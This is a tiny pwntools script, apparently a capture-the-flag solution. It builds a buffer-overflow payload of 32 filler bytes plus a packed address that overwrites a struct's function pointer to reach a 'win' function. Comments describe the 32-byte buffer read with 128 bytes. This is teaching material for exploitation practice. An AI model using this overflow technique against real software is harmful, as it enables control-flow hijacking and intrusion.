from pwn import *

# buf + addr_of_win

"""
typedef struct {
    char buf[32];    <- buf[32], but read 128!
    void (*fn)(void);    <- overflow buf + write to the fn our addr of win
} chunk;
"""

p = b"A"*32 + p64(0x1000004b0)
print(p)
